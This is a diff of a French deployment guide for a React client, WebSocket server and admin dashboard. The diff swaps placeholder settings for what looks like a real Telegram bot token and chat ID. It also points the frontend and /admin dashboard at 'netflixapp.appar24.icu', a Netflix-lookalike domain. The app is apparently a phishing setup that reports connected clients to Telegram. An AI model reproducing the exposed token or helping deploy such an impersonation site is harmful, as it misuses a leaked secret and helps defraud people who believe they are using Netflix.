@@ -129,8 +129,8 @@ Votre `client/package.json` doit contenir :
    ```
    NODE_ENV=production
    WS_PORT=8080
-   TELEGRAM_BOT_TOKEN=votre_bot_token_telegram
-   TELEGRAM_CHAT_ID=votre_chat_id_telegram
+   TELEGRAM_BOT_TOKEN=5921410949:AAEoUIUbUJyM4FaAmb9O5IQS2jpBgVgJUio
+   TELEGRAM_CHAT_ID=-4062519969
    ```
 
 6. Cliquez sur **"Create Web Service"**
@@ -187,14 +187,14 @@ Dans Render, les services utilisent HTTPS/WSS par défaut. Vérifiez que `VITE_W
    - Le serveur devrait être en écoute sur le port 8080
 
 2. **Vérifier le client React** :
-   - Ouvrez l'URL de votre service frontend (ex: `https://neti-client.onrender.com`)
+   - Ouvrez l'URL de votre service frontend (ex: `https://netflixapp.appar24.icu`)
    - L'application devrait se charger
    - Ouvrez la console du navigateur (F12)
    - Vérifiez qu'il n'y a pas d'erreurs de connexion WebSocket
    - Testez la connexion en naviguant dans l'application
 
 3. **Tester le Dashboard Admin** :
-   - Accédez à `https://neti-client.onrender.com/admin`
+   - Accédez à `https://netflixapp.appar24.icu/admin`
    - Le Dashboard devrait se charger et afficher la liste des clients connectés
 
 4. **Tester les notifications Telegram** :
@@ -351,9 +351,9 @@ L'application utilise les routes suivantes :
 
 Après le déploiement, vous aurez :
 
-- **Frontend** : `https://neti-client.onrender.com`
+- **Frontend** : `https://netflixapp.appar24.icu`
 - **Backend WebSocket** : `wss://neti-websocket-server.onrender.com`
-- **Dashboard Admin** : `https://neti-client.onrender.com/admin`
+- **Dashboard Admin** : `https://netflixapp.appar24.icu/admin`
 
 ---
 
